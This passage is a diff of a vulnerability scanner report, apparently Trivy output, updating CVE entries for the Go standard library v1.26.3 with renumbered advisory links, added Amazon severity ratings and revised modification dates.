+│                        │      │                  ├ [24]: https://access.redhat.com/errata/RHSA-2026:42082 
+│                        │      │                  ├ [25]: https://access.redhat.com/errata/RHSA-2026:42142 
+│                        │      │                  ├ [26]: https://access.redhat.com/errata/RHSA-2026:42150 
+│                        │      │                  ├ [27]: https://access.redhat.com/errata/RHSA-2026:42151 
+│                        │      │                  ├ [28]: https://access.redhat.com/errata/RHSA-2026:42240 
+│                        │      │                  ├ [29]: https://access.redhat.com/errata/RHSA-2026:42644 
+│                        │      │                  ├ [30]: https://access.redhat.com/security/cve/CVE-2026-27145 
+│                        │      │                  ├ [31]: https://bugzilla.redhat.com/2445356 
+│                        │      │                  ├ [32]: https://bugzilla.redhat.com/2484207 
+│                        │      │                  ├ [33]: https://bugzilla.redhat.com/show_bug.cgi?id=2445356 
+│                        │      │                  ├ [34]: https://bugzilla.redhat.com/show_bug.cgi?id=2484207 
+│                        │      │                  ├ [35]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2
 │                        │      │                  │       026-25679 
-│                        │      │                  ├ [22]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2
+│                        │      │                  ├ [36]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2
 │                        │      │                  │       026-27145 
-│                        │      │                  ├ [23]: https://errata.almalinux.org/9/ALSA-2026-36317.html 
-│                        │      │                  ├ [24]: https://errata.rockylinux.org/RLSA-2026:36317 
-│                        │      │                  ├ [25]: https://go.dev/cl/783621 
-│                        │      │                  ├ [26]: https://go.dev/issue/79694 
-│                        │      │                  ├ [27]: https://groups.google.com/g/golang-announce/c/tKs3rm
+│                        │      │                  ├ [37]: https://errata.almalinux.org/9/ALSA-2026-36317.html 
+│                        │      │                  ├ [38]: https://errata.rockylinux.org/RLSA-2026:36317 
+│                        │      │                  ├ [39]: https://go.dev/cl/783621 
+│                        │      │                  ├ [40]: https://go.dev/issue/79694 
+│                        │      │                  ├ [41]: https://groups.google.com/g/golang-announce/c/tKs3rm
 │                        │      │                  │       cBcKw 
-│                        │      │                  ├ [28]: https://linux.oracle.com/cve/CVE-2026-27145.html 
-│                        │      │                  ├ [29]: https://linux.oracle.com/errata/ELSA-2026-38995.html 
-│                        │      │                  ├ [30]: https://nvd.nist.gov/vuln/detail/CVE-2026-27145 
-│                        │      │                  ├ [31]: https://pkg.go.dev/vuln/GO-2026-5037 
-│                        │      │                  ├ [32]: https://security.access.redhat.com/data/csaf/v2/vex/
+│                        │      │                  ├ [42]: https://linux.oracle.com/cve/CVE-2026-27145.html 
+│                        │      │                  ├ [43]: https://linux.oracle.com/errata/ELSA-2026-39573.html 
+│                        │      │                  ├ [44]: https://nvd.nist.gov/vuln/detail/CVE-2026-27145 
+│                        │      │                  ├ [45]: https://pkg.go.dev/vuln/GO-2026-5037 
+│                        │      │                  ├ [46]: https://security.access.redhat.com/data/csaf/v2/vex/
 │                        │      │                  │       2026/cve-2026-27145.json 
-│                        │      │                  ╰ [33]: https://www.cve.org/CVERecord?id=CVE-2026-27145 
+│                        │      │                  ╰ [47]: https://www.cve.org/CVERecord?id=CVE-2026-27145 
 │                        │      ├ PublishedDate   : 2026-06-02T23:16:35.57Z 
-│                        │      ╰ LastModifiedDate: 2026-07-17T13:18:10.947Z 
-│                        ├ [9]  ╭ VulnerabilityID : CVE-2026-39822 
+│                        │      ╰ LastModifiedDate: 2026-07-21T12:17:50.053Z 
+│                        ├ [10] ╭ VulnerabilityID : CVE-2026-39822 
 │                        │      ├ VendorIDs        ─ [0]: GO-2026-4970 
 │                        │      ├ PkgID           : stdlib@v1.26.3 
 │                        │      ├ PkgName         : stdlib 
@@ -9318,6 +10939,7 @@
 │                        │      ├ Severity        : HIGH 
 │                        │      ├ CweIDs           ─ [0]: CWE-61 
 │                        │      ├ VendorSeverity   ╭ alma       : 3 
+│                        │      │                  ├ amazon     : 2 
 │                        │      │                  ├ bitnami    : 3 
 │                        │      │                  ├ oracle-oval: 3 
 │                        │      │                  ├ redhat     : 3 
@@ -9347,7 +10969,7 @@
 │                        │      │                  ╰ [14]: https://www.cve.org/CVERecord?id=CVE-2026-39822 
 │                        │      ├ PublishedDate   : 2026-07-08T17:17:21.31Z 
 │                        │      ╰ LastModifiedDate: 2026-07-13T14:54:26.317Z 
-│                        ├ [10] ╭ VulnerabilityID : CVE-2026-42504 
+│                        ├ [11] ╭ VulnerabilityID : CVE-2026-42504 
 │                        │      ├ VendorIDs        ─ [0]: GO-2026-5038 
 │                        │      ├ PkgID           : stdlib@v1.26.3 
 │                        │      ├ PkgName         : stdlib 
@@ -9392,7 +11014,7 @@
 │                        │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-42504 
 │                        │      ├ PublishedDate   : 2026-06-02T23:16:37.927Z 
 │                        │      ╰ LastModifiedDate: 2026-06-17T10:47:56.86Z 
-│                        ├ [11] ╭ VulnerabilityID : CVE-2026-42505 
+│                        ├ [12] ╭ VulnerabilityID : CVE-2026-42505 
 │                        │      ├ VendorIDs        ─ [0]: GO-2026-5856 
 │                        │      ├ PkgID           : stdlib@v1.26.3 
 │                        │      ├ PkgName         : stdlib 
@@ -9419,7 +11041,8 @@
 │                        │      │                   client hello. 
 │                        │      ├ Severity        : MEDIUM 
 │                        │      ├ CweIDs           ─ [0]: CWE-201 
-│                        │      ├ VendorSeverity   ╭ bitnami: 2 
+│                        │      ├ VendorSeverity   ╭ amazon : 2 
+│                        │      │                  ├ bitnami: 2 
 │                        │      │                  ╰ redhat : 2 
 │                        │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I
 │                        │      │                  │         │           :N/A:N 
@@ -9437,7 +11060,7 @@
 │                        │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-42505 
 │                        │      ├ PublishedDate   : 2026-07-08T17:17:21.497Z 
 │                        │      ╰ LastModifiedDate: 2026-07-13T17:05:36.303Z 
-│                        ╰ [12] ╭ VulnerabilityID : CVE-2026-42507 
+│                        ╰ [13] ╭ VulnerabilityID : CVE-2026-42507 
 │                               ├ VendorIDs        ─ [0]: GO-2026-5039 
 │                               ├ PkgID           : stdlib@v1.26.3 
 │                               ├ PkgName         : stdlib 
